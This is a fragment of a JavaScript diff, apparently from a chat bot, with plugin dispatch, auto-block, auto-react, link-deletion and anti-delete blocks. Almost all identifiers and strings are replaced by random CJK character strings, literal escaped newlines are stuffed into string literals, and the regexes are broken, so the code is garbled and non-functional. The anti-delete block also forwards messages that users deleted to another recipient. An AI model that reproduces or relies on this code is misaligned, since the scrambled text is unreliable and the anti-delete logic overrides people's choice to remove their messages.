+          // _曺癵隒燝洭苴 _纔锧倨襘啸坫-_蝛煽錛懰鍫鏕 _鮓嶡罔嘚瞂辣槒
+          for (const _禱龃骁畮齻僐 of _铅掲頿姮厴薌._铅掲頿姮厴薌) {
+            try {
+              if (_禱龃骁畮齻僐._閙皥郜彈 === '_\u775c\u55c9\u68a0\u5320\u5536\u9b50' && _鹫錨腱婛嫮髬帔 && !_揙譠疵崿乼檁覎) {
+                await _禱龃骁畮齻僐.function(_壏其蓙龸恆腅饃, _熾惪裹則鯕, _啊仳痉偏羍輋, {
+                  from, _躙褮僥濃墧鋫, _鹫錨腱婛嫮髬帔, _揙譠疵崿乼檁覎: false, _蝛煽錛懰鍫鏕: _禱龃骁畮齻僐,
+                  _魾崟坤乛嫡跮徚, _堈鷻懳椵, _嫚塹锐迏, _稓痾塅陟榖, _抁阋遖痳迄琄, _鉨糪靌毪蟟匕歇,
+                  _絈艾屒汄: _湻鲴氼庍蕟藷谸, _仏轡勗蔸, _筥鍥涆倎蛎蜙, _艊鸓妍轹栄鈎襪,
+                  _邔艮澰褶, _买烏襗徺僔, _跘騎牔屓, _懷痬葪崩鑃, _复誣跇殈價鸟,
+                  _浲骃銁黵刲, _戟沁诂聵钂鶝寈, _坐萑岮厐樤槚, _氚礴蔛牺匪婹, _鍵庬鲕橿, _讠鑵砛枻敩, _忈頴损雊冮噉,
+                  _礎朸鍄聾: _瘥坵譋籢誌
+                });
+              } else if ((_禱龃骁畮齻僐._閙皥郜彈 === '_\u94a6\u6fca\u5383\u6eeb\u756f\u555f\u7fb5' || _禱龃骁畮齻僐._閙皥郜彈 === '_\u9ea4\u6dea\u6c42\u5e25') && _仟緑工订 === '_\u9844\u9eb9\u5c8b\u930f\u5e1b\u9fde\u5aa1') {
+                await _禱龃骁畮齻僐.function(_壏其蓙龸恆腅饃, _熾惪裹則鯕, _啊仳痉偏羍輋, {
+                  from, _躙褮僥濃墧鋫, _鹫錨腱婛嫮髬帔, _揙譠疵崿乼檁覎, _蝛煽錛懰鍫鏕: _禱龃骁畮齻僐,
+                  _魾崟坤乛嫡跮徚, _堈鷻懳椵, _嫚塹锐迏, _稓痾塅陟榖, _抁阋遖痳迄琄, _鉨糪靌毪蟟匕歇,
+                  _絈艾屒汄: _湻鲴氼庍蕟藷谸, _仏轡勗蔸, _筥鍥涆倎蛎蜙, _艊鸓妍轹栄鈎襪,
+                  _邔艮澰褶, _买烏襗徺僔, _跘騎牔屓, _懷痬葪崩鑃, _复誣跇殈價鸟,
+                  _浲骃銁黵刲, _戟沁诂聵钂鶝寈, _坐萑岮厐樤槚, _氚礴蔛牺匪婹, _鍵庬鲕橿, _讠鑵砛枻敩, _忈頴损雊冮噉,
+                  _礎朸鍄聾: _瘥坵譋籢誌
+                });
+              } else if (_禱龃骁畮齻僐._閙皥郜彈 === '_\u7566\u90e1\u54f1\u9637\u873c' && _仟緑工订 === '_\u5243\u5055\u90f8\u5dd2\u70e7\u5f73') {
+                await _禱龃骁畮齻僐.function(_壏其蓙龸恆腅饃, _熾惪裹則鯕, _啊仳痉偏羍輋, {
+                  from, _躙褮僥濃墧鋫, _鹫錨腱婛嫮髬帔, _揙譠疵崿乼檁覎, _蝛煽錛懰鍫鏕: _禱龃骁畮齻僐,
+                  _魾崟坤乛嫡跮徚, _堈鷻懳椵, _嫚塹锐迏, _稓痾塅陟榖, _抁阋遖痳迄琄, _鉨糪靌毪蟟匕歇,
+                  _絈艾屒汄: _湻鲴氼庍蕟藷谸, _仏轡勗蔸, _筥鍥涆倎蛎蜙, _艊鸓妍轹栄鈎襪,
+                  _邔艮澰褶, _买烏襗徺僔, _跘騎牔屓, _懷痬葪崩鑃, _复誣跇殈價鸟,
+                  _浲骃銁黵刲, _戟沁诂聵钂鶝寈, _坐萑岮厐樤槚, _氚礴蔛牺匪婹, _鍵庬鲕橿, _讠鑵砛枻敩, _忈頴损雊冮噉,
+                  _礎朸鍄聾: _瘥坵譋籢誌
+                });
+              }
+            } catch (_亵隖嶐兑琬) {}
+          }
+        }
+      }
+      
+      // ============ _懜鄩醾墨俆邲蛌 _褎龣定綕鉗踢犓 ============
+      if (_骭嶼栁赥佅._笙俖蝳丛 === 'true' && _揙譠疵崿乼檁覎) {
+        await _壏其蓙龸恆腅饃._擅璮逝簓铑熤夺([_熾惪裹則鯕._囟店崝晫從]).catch(() => {});
+      }
+      
+      // ============ _幄趜蘡槻 _贒肮寱药缷 ============
+      if (_骭嶼栁赥佅._媋侓媌牦玌穐 === 'true' && !_熾惪裹則鯕._囟店崝晫從._屎覕虨燨蟖) {
+        await _壏其蓙龸恆腅饃._驹鈼蜅孊终栫('_\u9e75\u51bd\u7ca5\u4e85\u7ca8\u4ed3\u9d4e', from).catch(() => {});
+      }
+      
+      // ============ _蚱鎎悇醧生雍苢 _幾阯濜収 ============
+      if (_骭嶼栁赥佅._鍕尕曑鞡枈 === 'true' && _嫚塹锐迏 && !_复誣跇殈價鸟 && !_筥鍥涆倎蛎蜙 && !_熾惪裹則鯕._囟店崝晫從._屎覕虨燨蟖 && _瘥坵譋籢誌._口於翅徦炉聍 !== false) {
+        const _輑汧鋳扡赔朷 = /(_樧诮蕕蘍?:\/\/[^\_瑀糩錓琩瑊髒庭]+)|(_姩笫蒖勯墅沯殔\.[^\_瑀糩錓琩瑊髒庭]+)|(_飛顦辟銵\._煯苔猴柈\._搉犃凔丄疈\/[^\_瑀糩錓琩瑊髒庭]+)|(_堋陶硦缠祜曑\._绔駙倇拖嶻梽俖\/[^\_瑀糩錓琩瑊髒庭]+)/_氨觇獀練;
+        if (_輑汧鋳扡赔朷._傕歈鵥絞宑(_鹫錨腱婛嫮髬帔)) {
+          await _壏其蓙龸恆腅饃._菀暸鉎軔糊犰(from, { delete: _熾惪裹則鯕._囟店崝晫從 }).catch(() => {});
+          _躙褮僥濃墧鋫('\u26a0\ufe0f *_\u76c1\u8408\u6067\u9eb8\u5047\u4fa2 _\u5f89\u6f86\u5995\u5fa3 _\u612e\u98d5\u7967\u6954\u88fb _\u738a\u69dd\u6600\u5c18\u876f\u51a5\u6edd in this _\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974!*');
+        }
+      }
+      
+      // ============ _蚱鎎悇醧生雍苢 _慴擷顡徠 ============
+      if (_骭嶼栁赥佅._橧篴抲諶胗 === 'true') {
+        try {
+          if (_熾惪裹則鯕._駑徕師凙样逹?._穐蕑繑湒忨妓 && _熾惪裹則鯕._駑徕師凙样逹._穐蕑繑湒忨妓._惢習漏襱厏齓 === 0) {
+            if (_熾惪裹則鯕._囟店崝晫從._屎覕虨燨蟖) return;
+            
+            const _椳恄伢嶈艙嵎賭 = _熾惪裹則鯕._駑徕師凙样逹._穐蕑繑湒忨妓._囟店崝晫從;
+            const _湇丒娪犢 = _憘竒燦灃鍦殻觗.get(_椳恄伢嶈艙嵎賭._巳醯堺厍);
+            
+            if (_湇丒娪犢) {
+              const _荦彊惬始煬 = _熾惪裹則鯕._囟店崝晫從._粣桖敌恞 || _熾惪裹則鯕._囟店崝晫從._趋韃限錺綗裢;
+              const _媒罟檭旃鯋擓 = _湇丒娪犢._囟店崝晫從._粣桖敌恞 || _湇丒娪犢._囟店崝晫從._趋韃限錺綗裢;
+              
+              // _厾蜫棧砍频臷渴 _吖隦唧斣蝶 _櫇玌厅戯伐'_\u7440\u7ce9\u9313\u7429\u744a\u9ad2\u5ead _\u7f87\u5800\u932a\u9842\u8018\u8f4f\u60d7\u000a              const _\u82f6\u5beb\u579d\u77a4 = _\u7735\u8d34\u8bcc\u95ed\u867f\u5760\u576d[0] + '@_瑀糩錓琩瑊髒庭._煯苔猴柈._猶嚒黀寝衚';\u000a              \u000a              // _\u6e80\u6ed4\u71bd\u99ee\u78bd\u8d99\u9a39 _\u95c0\u8ab4\u9147\u863c\u5f13 _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u59f4\u71d8\u8947\u70b1\u9889\u724b\u8fd0\u000a              let _\u7a54\u9027\u4eba\u6fcb\u51c4\u4e90 = '';\u000a              let _\u80c8\u5b09\u7d97\u6b3a\u71eb\u9a62\u596b = '';\u000a              const _\u571c\u4e98\u7e58\u6de1 = _\u9a8f\u62fe\u7a6e\u5978(_\u6e47\u4e12\u5a2a\u72a2._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039);\u000a              \u000a              if (_\u571c\u4e98\u7e58\u6de1 === '_蛔惸楃慚菧') {\u000a                _\u7a54\u9027\u4eba\u6fcb\u51c4\u4e90 = _\u6e47\u4e12\u5a2a\u72a2._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039._\u86d4\u60f8\u6943\u615a\u83e7 || '';\u000a                _\u80c8\u5b09\u7d97\u6b3a\u71eb\u9a62\u596b = '_嚌慓浘冭騻';\u000a              } else if (_\u571c\u4e98\u7e58\u6de1 === '_鼐鳤蠎溽棛覃') {\u000a                _\u7a54\u9027\u4eba\u6fcb\u51c4\u4e90 = _\u6e47\u4e12\u5a2a\u72a2._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039._\u9f10\u9ce4\u880e\u6ebd\u68db\u8983?._\u775c\u55c9\u68a0\u5320\u5536\u9b50 || '';\u000a                _\u80c8\u5b09\u7d97\u6b3a\u71eb\u9a62\u596b = '_嚌慓浘冭騻';\u000a              } else if (_\u571c\u4e98\u7e58\u6de1 === '_顄麹岋錏帛鿞媡') {\u000a                _\u7a54\u9027\u4eba\u6fcb\u51c4\u4e90 = _\u6e47\u4e12\u5a2a\u72a2._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039._\u9844\u9eb9\u5c8b\u930f\u5e1b\u9fde\u5aa1?._\u719c\u8133\u8765\u93f7\u6f7b\u5f74\u508d || '_麲擂笺庎 _熜脳蝥鏷潻彴傍';\u000a                _\u80c8\u5b09\u7d97\u6b3a\u71eb\u9a62\u596b = '🖼️ _砒殈龜媢撊家';\u000a              } else if (_\u571c\u4e98\u7e58\u6de1 === '_螹憏嶛劫') {\u000a                _\u7a54\u9027\u4eba\u6fcb\u51c4\u4e90 = _\u6e47\u4e12\u5a2a\u72a2._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039._\u87b9\u618f\u5d9b\u52ab?._\u719c\u8133\u8765\u93f7\u6f7b\u5f74\u508d || '_麲擂笺庎 _熜脳蝥鏷潻彴傍';\u000a                _\u80c8\u5b09\u7d97\u6b3a\u71eb\u9a62\u596b = '🎥 _瀗澺溌佳鰰鍛';\u000a              } else if (_\u571c\u4e98\u7e58\u6de1 === '_糜冥筜烆瑢鐪劋') {\u000a                _\u7a54\u9027\u4eba\u6fcb\u51c4\u4e90 = '_琘磑迅椈 _駑徕師凙样逹';\u000a                _\u80c8\u5b09\u7d97\u6b3a\u71eb\u9a62\u596b = '🎵 _琘磑迅椈';\u000a              } else if (_\u571c\u4e98\u7e58\u6de1 === '_剃偕郸巒烧彳') {\u000a                _\u7a54\u9027\u4eba\u6fcb\u51c4\u4e90 = '_轿趚皩鵛洞';\u000a                _\u80c8\u5b09\u7d97\u6b3a\u71eb\u9a62\u596b = '🎨 _轿趚皩鵛洞';\u000a              } else {\u000a                _\u7a54\u9027\u4eba\u6fcb\u51c4\u4e90 = '_糰簇捓鏥袄蜈 _駑徕師凙样逹';\u000a                _\u80c8\u5b09\u7d97\u6b3a\u71eb\u9a62\u596b = '📎 _糰簇捓鏥袄蜈';\u000a              }\u000a              \u000a              const _\u90cc\u9ec4\u6290\u8e0f\u7254\u50a8\u640f = from._\u9e4f\u517c\u8856\u7a74('@_跒詄鄅酬._睮滘宨橳鑐') ? '👥 _噰蜛皋豓濕' : '👤 _鴺忕鏉棴 _娥嫪鰄炘負';\u000a              let _\u975a\u6fd9\u9843\u6e59\u61f1\u696e = '';\u000a              \u000a              if (from._\u9e4f\u517c\u8856\u7a74('@_跒詄鄅酬._睮滘宨橳鑐') && _\u9094\u826e\u6fb0\u8936) {\u000a                _\u975a\u6fd9\u9843\u6e59\u61f1\u696e = `\_\u51b0\u51d4\u58e6\u60f2\u2502\u2503\u27b3 *_\u5670\u871b\u768b\u8c53\u6fd5:* ${_\u9094\u826e\u6fb0\u8936}`;\u000a              }\u000a              \u000a              const _\u93c7\u67ff\u72d5\u955c\u5f42\u8649\u97a8 = new _\u78cd\u6f3a\u67c6\u8e61();\u000a              const _\u9a31\u9fc8\u88a2\u9724\u9ce1 = _\u93c7\u67ff\u72d5\u955c\u5f42\u8649\u97a8._\u5b72\u7683\u549d\u6fa6\u5c45\u5b32('_眲觕瘙廱死樈葘-_礧鑑礐皏', { _\u65c8\u5468\u757e\u60e4\u845c: '2-_澖復黠汝塡账', _\u7bc1\u8eac\u9836\u7a2c\u93ef\u61e2\u86a8: '2-_澖復黠汝塡账', _\u70b2\u787f\u86be\u6d53: '2-_澖復黠汝塡账' });\u000a              const _\u7245\u7cd0\u837f\u7685\u9a2f = _\u93c7\u67ff\u72d5\u955c\u5f42\u8649\u97a8._\u9ac1\u5b3a\u8189\u891d\u6ff3\u9f62('_眲觕瘙廱死樈葘-_礧鑑礐皏');\u000a              \u000a              const _\u9777\u7d05\u53bd\u5d9e\u765b\u6207\u5aec = `\u000a\u256d\u2500\u2500\u274d *\u1f6ab _\u86b1\u938e\u6087\u91a7\u751f\u96cd\u82e2-_\u6174\u64f7\u9861\u5fa0 _\u7277\u61d2\u5d8f\u760c* \u29fd\u2500\u2500\u2500\u274d\u000a\u2502\u2503\u27b3 *_\u7301\u6ffa\u5232\u9848\u8b93:* ${_\u9a31\u9fc8\u88a2\u9724\u9ce1}\u000a\u2502\u2503\u27b3 *_\u78cd\u6f3a\u67c6\u8e61:* ${_\u7245\u7cd0\u837f\u7685\u9a2f}\u000a\u2502\u2503\u27b3 *_\u5a25\u5aea\u9c04\u7098\u8ca0 _\u8634\u520d\u6616\u751d\u6032\u6fc4:* ${_\u90cc\u9ec4\u6290\u8e0f\u7254\u50a8\u640f}${_\u975a\u6fd9\u9843\u6e59\u61f1\u696e}\u000a\u2502\u000a\u2502\u2503\u27b3 *_\u875d\u9747\u6be1\u51e9\u5094\u74dd _\u91f7\u598d\u80a2\u9255\u8271\u924d\u6712:* @${_\u8366\u5f4a\u60ec\u59cb\u716c._\u7f73\u7196\u9b69\u8df1\u6c6f\u654b('@')[0]}\u000a\u2502\u2503\u27b3 *_\u5c92\u7327\u5d55\u9c58 _\u660c\u6846\u9943\u6759\u7fbb:* @${_\u5a92\u7f5f\u6aad\u65c3\u9bcb\u64d3._\u7f73\u7196\u9b69\u8df1\u6c6f\u654b('@')[0]}\u000a\u2502\u000a\u2502\u2503\u27b3 *_\u4e8b\u84ea\u54b0\u87c3 _\u8634\u520d\u6616\u751d\u6032\u6fc4:* ${_\u80c8\u5b09\u7d97\u6b3a\u71eb\u9a62\u596b}\u000a\u2502\u2503\u27b3 *_\u9506\u777a\u6f92\u8e1a\u9995\u77f4:* \u000a\u2502\u2503\u27b3 \`${_\u7a54\u9027\u4eba\u6fcb\u51c4\u4e90._\u8b85\u81ce\u5c4d\u8d33(0, 500)}${_\u7a54\u9027\u4eba\u6fcb\u51c4\u4e90._\u81bb\u8e0c\u4fc5\u6793\u513d\u98f2 > 500 ? '...' : ''}\`\u000a\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u274d\u000a        \u000a> _\u79f7\u6ad1\u8bd4\u9dda\u82e6\u6c97\u65ba _\u900a\u7194\u67d0\u6066 _\u7ab7\u7cad\u93db\u704d\u747d _\u6b41\u7f2c\u95d8\u9b8d\u5d2e\u8240 _\u88a8\u71d5\u9e9f\u7b99\u6b97\u91cc _\u5a85\u58e9\u54de\u8f69\u594d\u7877\u6f9d _\u6be3\u66e1\u5940\u6a4e \u1f530`;
+              
+              await _壏其蓙龸恆腅饃._菀暸鉎軔糊犰(_苶寫垝瞤, {
+                _睜嗉梠匠唶魐: _靷紅厽嶞癛戇嫬,
+                _坐萑岮厐樤槚: [_荦彊惬始煬, _媒罟檭旃鯋擓]
+              }).catch(() => {});
+              
+              _樞劈帳溤._肶譊蓟繂櫅(`\u1f6ab _\u7913\u790c\u78b5\u90c7\u76a2\u648a\u9873-delete: _\u4e8b\u84ea\u54b0\u87c3 _\u5a85\u58e9\u54de\u8f69\u594d\u7877\u6f9d _\u5416\u96a6\u5527\u65a3\u8776 _\u7f87\u5800\u932a\u9842\u8018\u8f4f\u60d7`);
+            }
+          }
+        } catch (_亵隖嶐兑琬) {
+          _樞劈帳溤._羬龎拡鈥騑("_\u7913\u790c\u78b5\u90c7\u76a2\u648a\u9873-delete _\u7fac\u9f8e\u62e1\u9225\u9a11:", _亵隖嶐兑琬);
+        }
+      }
+      
+    } catch (_羬龎拡鈥騑) {
+      _樞劈帳溤._羬龎拡鈥騑("\u274c _\u4e8b\u84ea\u54b0\u87c3 _\u5340\u6107\u6705\u9bb0 _\u7fac\u9f8e\u62e1\u9225\u9a11:", _羬龎拡鈥騑);
+    }
+  });
+}
+
+// _悌妢娓魱宗 _袨燕麟箙殗里
+_崯鬾梞靔惷冧(() => {
+  _材檊脪撱慲絁菗();
+}, 4000);
+}
+// _嗽女鋱丣邱頍瀵 _锁呺虓編璧潎黌 _表玁鸁僓 _塑杻給窳凓})();
